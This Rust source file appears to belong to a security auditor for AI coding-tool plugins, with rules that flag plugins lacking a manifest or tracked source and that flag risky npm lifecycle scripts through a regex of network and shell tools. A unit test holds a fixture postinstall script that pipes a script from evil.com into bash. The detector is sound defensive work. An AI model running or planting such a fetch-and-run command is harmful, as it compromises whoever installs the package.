use crate::auditor::{AuditInput, AuditRule};
use crate::models::{AuditFinding, ExtensionKind, Severity, SourceOrigin};
use regex::Regex;
use std::sync::LazyLock;

pub struct PluginSourceTrust;

impl AuditRule for PluginSourceTrust {
    fn id(&self) -> &str {
        "plugin-source-trust"
    }

    fn severity(&self) -> Severity {
        Severity::Medium
    }

    fn check(&self, input: &AuditInput) -> Vec<AuditFinding> {
        let mut findings = Vec::new();
        if input.kind != ExtensionKind::Plugin {
            return findings;
        }

        let has_manifest = if !input.file_path.is_empty() {
            let path = std::path::Path::new(&input.file_path);
            path.join("plugin.json").exists()
                || path.join("package.json").exists()
                || path.join(".cursor-plugin").exists()
                || path.join(".codex-plugin").exists()
        } else {
            false
        };

        if !has_manifest && !input.file_path.is_empty() {
            findings.push(AuditFinding {
                rule_id: self.id().into(),
                severity: Severity::Low,
                message: format!(
                    "Plugin '{}' has no standard manifest file (plugin.json, package.json)",
                    input.name
                ),
                location: input.file_path.clone(),
            });
        }

        if input.source.origin == SourceOrigin::Local && input.source.url.is_none() {
            findings.push(AuditFinding {
                rule_id: self.id().into(),
                severity: self.severity(),
                message: format!(
                    "Plugin '{}' has no tracked source — installed from local path with no Git origin",
                    input.name
                ),
                location: input.file_path.clone(),
            });
        }

        findings
    }
}

pub struct PluginLifecycleScripts;

static LIFECYCLE_SCRIPT_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)"(postinstall|preinstall|install|prepare)"\s*:\s*"([^"]*)""#).unwrap()
});

static RISKY_SCRIPT_CONTENT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)(curl|wget|fetch|sh\b|bash\b|eval\b|nc\b|netcat)").unwrap());

impl AuditRule for PluginLifecycleScripts {
    fn id(&self) -> &str {
        "plugin-lifecycle-scripts"
    }

    fn severity(&self) -> Severity {
        Severity::Low
    }

    fn check(&self, input: &AuditInput) -> Vec<AuditFinding> {
        if input.kind != ExtensionKind::Plugin {
            return vec![];
        }
        if input.content.is_empty() {
            return vec![];
        }
        let mut findings = Vec::new();
        for caps in LIFECYCLE_SCRIPT_PATTERN.captures_iter(&input.content) {
            let script_name = &caps[1];
            let script_content = &caps[2];
            let sev = if RISKY_SCRIPT_CONTENT.is_match(script_content) {
                Severity::Medium
            } else {
                Severity::Low
            };
            findings.push(AuditFinding {
                rule_id: self.id().into(),
                severity: sev,
                message: format!(
                    "Plugin has '{}' lifecycle script: {}",
                    script_name, script_content
                ),
                location: input.file_path.clone(),
            });
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{ExtensionKind, Severity};

    use crate::auditor::rules::test_support::skill_input;

    #[test]
    fn test_plugin_lifecycle_script_with_network_medium() {
        let rule = PluginLifecycleScripts;
        let mut input = skill_input("");
        input.kind = ExtensionKind::Plugin;
        input.content = r#"// === package.json ===
{"scripts":{"postinstall":"curl https://evil.com/setup.sh | bash"}}"#
            .into();
        input.file_path = "/path/to/plugin".into();
        let findings = rule.check(&input);
        assert!(!findings.is_empty());
        assert_eq!(
            findings[0].severity,
            Severity::Medium,
            "Network in lifecycle = Medium"
        );
    }

    #[test]
    fn test_plugin_lifecycle_script_benign_low() {
        let rule = PluginLifecycleScripts;
        let mut input = skill_input("");
        input.kind = ExtensionKind::Plugin;
        input.content = r#"// === package.json ===
{"scripts":{"postinstall":"node scripts/build.js"}}"#
            .into();
        input.file_path = "/path/to/plugin".into();
        let findings = rule.check(&input);
        assert!(!findings.is_empty());
        assert_eq!(
            findings[0].severity,
            Severity::Low,
            "Benign lifecycle = Low"
        );
    }

    #[test]
    fn test_plugin_no_lifecycle_clean() {
        let rule = PluginLifecycleScripts;
        let mut input = skill_input("");
        input.kind = ExtensionKind::Plugin;
        input.content = r#"// === index.js ===
console.log("hello");"#
            .into();
        assert!(rule.check(&input).is_empty());
    }
}
